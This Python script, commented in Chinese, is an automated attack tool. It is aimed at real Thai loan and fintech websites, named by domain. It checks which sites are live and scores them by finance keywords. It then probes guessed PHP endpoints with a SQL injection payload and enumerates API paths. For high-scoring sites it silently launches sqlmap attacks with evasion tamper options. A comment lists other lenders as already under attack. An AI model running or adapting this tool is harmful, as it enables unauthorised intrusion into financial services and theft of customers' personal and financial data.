#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
泰国金融目标猎手系统
Thai Financial Target Hunter System
基于真实泰国金融市场的目标发现
"""

import requests
import re
import time
import json
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ThaiFinancialTargetHunter:
    """泰国金融目标猎手"""

    def __init__(self):
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]

        # 已知泰国贷款和金融服务公司（基于真实市场）
        self.known_thai_companies = [
            'tunecash.co.th', 'cashwagon.co.th', 'jazzcash.co.th', 'digido.co.th',
            'loanexpress.in.th', 'firstloan.co.th', 'creditjet.co.th', 'moneybus.co.th',
            'robinhood.co.th', 'finvera.co.th', 'kreditbee.co.th', 'cashe.co.th',
            'loanme.co.th', 'ezmoney.co.th', 'fastloan.co.th', 'quickloan.in.th',
            'cashnow.in.th', 'loanhero.co.th', 'fintech.co.th', 'payday.co.th'
        ]

        # 避免的目标（已经在攻击的）
        self.avoid_targets = [
            'moneycat.co.th', 'mula-x.com', 'rocket-cash.com', 'kloan.co.th',
            'ngerntidlor.com', 'peacoop.or.th', 'ngoenmun.com', 'quickcash.in.th',
            'quickcash.co.th'
        ]

        # 泰国金融相关词汇
        self.finance_keywords = [
            'loan', 'credit', 'cash', 'money', 'finance', 'fintech',
            'express', 'fast', 'quick', 'easy', 'instant', 'rapid',
            'digital', 'online', 'mobile', 'payday', 'short-term',
            'personal', 'consumer', 'micro', 'small', 'mini'
        ]

        self.discovered_targets = []

    def test_company_target(self, company_domain):
        """测试公司目标"""
        try:
            url = f"https://{company_domain}"
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'th-TH,th;q=0.9,en;q=0.8'
            }

            response = requests.get(
                url,
                headers=headers,
                timeout=15,
                verify=False,
                allow_redirects=True
            )

            if response.status_code == 200:
                content = response.text.lower()
                finance_score = 0

                # 检查金融关键词
                for keyword in self.finance_keywords:
                    if keyword in content:
                        finance_score += 1

                # 检查贷款特定功能
                loan_features = [
                    'application', 'apply now', 'get loan', 'loan calculator',
                    'emi calculator', 'interest rate', 'monthly payment',
                    'สมัคร', 'กู้เงิน', 'คำนวณ', 'ดอกเบี้ย', 'ผ่อน'
                ]

                for feature in loan_features:
                    if feature in content:
                        finance_score += 2

                # 检查技术栈
                tech_indicators = [
                    'application.php', 'apply.php', 'loan.php', 'user.php',
                    'customer.php', 'member.php', 'account.php', 'api/v1',
                    'wp-content', 'wp-json', 'admin.php'
                ]

                tech_count = 0
                for tech in tech_indicators:
                    if tech in content:
                        tech_count += 1

                if finance_score >= 3:
                    return {
                        'url': url,
                        'status_code': response.status_code,
                        'finance_score': finance_score,
                        'tech_count': tech_count,
                        'title': self.extract_title(response.text),
                        'is_finance_site': True,
                        'content_length': len(content),
                        'response_time': response.elapsed.total_seconds()
                    }

        except Exception as e:
            pass

        return None

    def extract_title(self, html_content):
        """提取网页标题"""
        try:
            title_match = re.search(r'<title[^>]*>([^<]+)</title>', html_content, re.IGNORECASE)
            if title_match:
                return title_match.group(1).strip()
        except:
            pass
        return "Unknown"

    def find_vulnerability_points(self, base_url):
        """查找漏洞点"""
        vulnerability_points = []

        # 常见的漏洞URL模式
        vuln_patterns = [
            f"{base_url}/application.php?id=1",
            f"{base_url}/apply.php?id=1",
            f"{base_url}/loan.php?id=1",
            f"{base_url}/user.php?id=1",
            f"{base_url}/member.php?id=1",
            f"{base_url}/customer.php?id=1",
            f"{base_url}/account.php?id=1",
            f"{base_url}/details.php?id=1",
            f"{base_url}/view.php?id=1",
            f"{base_url}/info.php?id=1"
        ]

        # 测试SQL注入
        for vuln_url in vuln_patterns[:5]:  # 限制测试数量
            try:
                # 基本SQL注入测试
                test_payload = "1' OR '1'='1"
                param = 'id'

                if '?' in vuln_url:
                    # URL已有参数
                    response = requests.get(
                        vuln_url.replace('id=1', f'id={test_payload}'),
                        headers={'User-Agent': random.choice(self.user_agents)},
                        timeout=5,
                        verify=False
                    )
                else:
                    # 添加参数
                    response = requests.get(
                        f"{vuln_url}?{param}={test_payload}",
                        headers={'User-Agent': random.choice(self.user_agents)},
                        timeout=5,
                        verify=False
                    )

                # 检查响应
                if response.elapsed.total_seconds() > 2 or 'sql' in response.text.lower():
                    vulnerability_points.append({
                        'url': vuln_url,
                        'type': 'SQL注入',
                        'parameter': param,
                        'payload': test_payload,
                        'response_time': response.elapsed.total_seconds(),
                        'evidence': 'Time delay or SQL error detected'
                    })

            except:
                continue

        return vulnerability_points

    def find_api_endpoints(self, base_url):
        """查找API端点"""
        api_patterns = [
            '/api/v1/users', '/api/application', '/api/loan',
            '/api/customer', '/api/member', '/api/account',
            '/v1/apply', '/mobile/api/application',
            '/wp-json/wp/v2/users', '/rest/api/loan'
        ]

        discovered_apis = []

        for api_path in api_patterns:
            api_url = urljoin(base_url, api_path)
            try:
                response = requests.get(
                    api_url,
                    headers={'User-Agent': random.choice(self.user_agents)},
                    timeout=5,
                    verify=False
                )

                if response.status_code == 200:
                    discovered_apis.append({
                        'endpoint': api_path,
                        'status': response.status_code,
                        'response_length': len(response.text)
                    })
            except:
                continue

        return discovered_apis

    def launch_targeted_attacks(self, target):
        """发起针对性攻击"""
        attacks = []

        # SQL注入攻击
        if target.get('vulnerability_points'):
            for vuln in target['vulnerability_points'][:3]:  # 限制攻击数量
                cmd = f'sqlmap -u "{vuln["url"]}" -p {vuln["parameter"]} --batch --level=3 --risk=2 --random-agent --tamper=space2comment,randomcase --fresh-queries --threads=6'

                try:
                    import subprocess
                    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    attacks.append({
                        'type': 'SQL注入',
                        'target': vuln['url'],
                        'command': cmd,
                        'status': 'launched'
                    })
                    print(f"  攻击已启动: SQL注入 - {vuln['url']}")
                except:
                    pass

        # API攻击
        if target.get('api_endpoints'):
            for api in target['api_endpoints'][:2]:
                api_url = urljoin(target['url'], api['endpoint'])
                cmd = f'sqlmap -u "{api_url}" --batch --level=2 --risk=1 --random-agent --fresh-queries'

                try:
                    import subprocess
                    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    attacks.append({
                        'type': 'API攻击',
                        'target': api_url,
                        'command': cmd,
                        'status': 'launched'
                    })
                    print(f"  攻击已启动: API - {api_url}")
                except:
                    pass

        return attacks

    def generate_hunter_report(self, targets):
        """生成猎手报告"""
        print(f"\n=== 泰国金融目标猎手报告 ===")
        print(f"猎取时间: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"猎取目标: {len(targets)}")

        report = {
            'hunt_time': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_targets_hunted': len(targets),
            'high_value_targets': [],
            'medium_value_targets': [],
            'low_value_targets': [],
            'attacks_initiated': []
        }

        for target in targets:
            # 计算综合评分
            score = target['finance_score'] + (target.get('tech_count', 0) * 0.5)

            if score >= 8:
                category = 'high'
                # 立即攻击高价值目标
                attacks = self.launch_targeted_attacks(target)
                report['attacks_initiated'].extend(attacks)
            elif score >= 5:
                category = 'medium'
            else:
                category = 'low'

            target_data = {
                'url': target['url'],
                'title': target.get('title', 'Unknown'),
                'finance_score': target['finance_score'],
                'tech_count': target.get('tech_count', 0),
                'total_score': score,
                'vulnerability_points': target.get('vulnerability_points', []),
                'api_endpoints': target.get('api_endpoints', []),
                'response_time': target.get('response_time', 0)
            }

            if category == 'high':
                report['high_value_targets'].append(target_data)
            elif category == 'medium':
                report['medium_value_targets'].append(target_data)
            else:
                report['low_value_targets'].append(target_data)

        # 保存报告
        with open('thai_financial_hunter_report.json', 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)

        print(f"\n=== 目标分类 ===")
        print(f"🔥 高价值目标: {len(report['high_value_targets'])} 个")
        print(f"🟡 中价值目标: {len(report['medium_value_targets'])} 个")
        print(f"🟢 低价值目标: {len(report['low_value_targets'])} 个")
        print(f"🚀 已发起攻击: {len(report['attacks_initiated'])} 个")

        return report

    def run_financial_hunt(self):
        """运行金融猎取"""
        print("🏹 启动泰国金融目标猎手系统...")

        # 1. 准备目标列表
        all_targets = []

        # 添加已知公司
        for company in self.known_thai_companies:
            if not any(avoid in company for avoid in self.avoid_targets):
                all_targets.append(company)

        # 生成变体
        variants = []
        for company in all_targets[:10]:  # 限制数量
            # 去掉域名后缀，添加新的变体
            base_name = company.split('.')[0]
            new_domains = [
                f"{base_name}.asia", f"{base_name}.net",
                f"{base_name}.org", f"{base_name}.info"
            ]
            variants.extend(new_domains)

        all_targets.extend(variants)
        all_targets = list(set(all_targets))[:40]  # 去重并限制数量

        print(f"📋 准备猎取 {len(all_targets)} 个金融目标")

        # 2. 测试目标
        print("\n🔍 测试目标存活性...")
        live_targets = []

        with ThreadPoolExecutor(max_workers=8) as executor:
            futures = {executor.submit(self.test_company_target, target): target for target in all_targets}

            for future in as_completed(futures):
                target = future.result()
                if target and target['is_finance_site']:
                    live_targets.append(target)
                    print(f"  ✅ 猎取成功: {target['url']} (评分: {target['finance_score']})")

        print(f"\n📊 成功猎取: {len(live_targets)} 个金融网站")

        # 3. 深度扫描前15个目标
        print("\n🔬 深度扫描前15个高价值目标...")
        live_targets.sort(key=lambda x: x['finance_score'], reverse=True)

        for i, target in enumerate(live_targets[:15]):
            print(f"\n[{i+1}/15] 深度扫描: {target['url']}")

            # 查找漏洞点
            vuln_points = self.find_vulnerability_points(target['url'])
            if vuln_points:
                target['vulnerability_points'] = vuln_points
                print(f"  ⚠️ 发现漏洞点: {len(vuln_points)} 个")

            # 查找API端点
            apis = self.find_api_endpoints(target['url'])
            if apis:
                target['api_endpoints'] = apis
                print(f"  🔌 发现API端点: {len(apis)} 个")

        # 4. 生成报告并攻击高价值目标
        self.discovered_targets = live_targets
        report = self.generate_hunter_report(live_targets)

        return report

def main():
    """主函数"""
    hunter = ThaiFinancialTargetHunter()

    try:
        report = hunter.run_financial_hunt()

        print(f"\n🎯 发现的高价值目标:")
        for i, target in enumerate(report['high_value_targets'][:5], 1):
            print(f"{i}. {target['url']} (综合评分: {target['total_score']:.1f})")
            print(f"   漏洞点: {len(target['vulnerability_points'])}, API端点: {len(target['api_endpoints'])}")

        print(f"\n📁 猎手报告已保存到: thai_financial_hunter_report.json")

    except KeyboardInterrupt:
        print("\n⚠️ 猎取过程已取消")
    except Exception as e:
        print(f"❌ 猎取错误: {e}")

if __name__ == "__main__":
    main()